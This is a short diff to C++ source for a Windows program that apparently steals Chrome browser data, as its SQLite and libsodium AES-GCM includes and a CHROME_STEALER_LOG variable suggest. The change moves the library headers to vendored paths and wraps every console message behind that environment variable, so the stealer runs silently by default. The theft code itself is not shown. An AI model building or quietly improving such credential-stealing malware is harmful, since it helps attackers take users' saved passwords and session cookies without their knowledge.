@@ -5,12 +5,12 @@
 #include <Windows.h>
 #include <Shlobj.h>
 #include <string>
-#include <nlohmann/json.hpp>
+#include "include/nlohmann/json.hpp"
 #include <locale>
 #include <codecvt>
-#include <sqlite3.h>
-#include <sodium/core.h>
-#include <sodium/crypto_aead_aes256gcm.h>
+#include "include/sqlite/sqlite3.h"
+#include "include/sodium/core.h"
+#include "include/sodium/crypto_aead_aes256gcm.h"
 #include <vector>
 #include <fstream>
 #include <wincrypt.h>
@@ -38,9 +38,21 @@ using json = nlohmann::json;
 #define GREEN   "\033[32m"
 #define YELLOW  "\033[33m"
 
-#define okay(msg, ...) printf(GREEN "[+] " RESET msg "\n", ##__VA_ARGS__)
-#define warn(msg, ...) printf(PURPLE "[-] " RESET msg "\n", ##__VA_ARGS__)
-#define info(msg, ...) printf(YELLOW "[i] " RESET msg "\n", ##__VA_ARGS__)
+static inline bool cs_is_log_enabled() {
+    static bool inited = false;
+    static bool enabled = false;
+    if (!inited) {
+        WCHAR buf[2] = { 0 };
+        DWORD n = GetEnvironmentVariableW(L"CHROME_STEALER_LOG", buf, 2);
+        enabled = (n > 0);
+        inited = true;
+    }
+    return enabled;
+}
+
+#define okay(msg, ...) do { if (cs_is_log_enabled()) printf(GREEN "[+] " RESET msg "\n", ##__VA_ARGS__); } while(0)
+#define warn(msg, ...) do { if (cs_is_log_enabled()) printf(PURPLE "[-] " RESET msg "\n", ##__VA_ARGS__); } while(0)
+#define info(msg, ...) do { if (cs_is_log_enabled()) printf(YELLOW "[i] " RESET msg "\n", ##__VA_ARGS__); } while(0)
 
 //Checks if Chrome is installed in the local machine.
 //@turn a bool stating if it is installed or not.
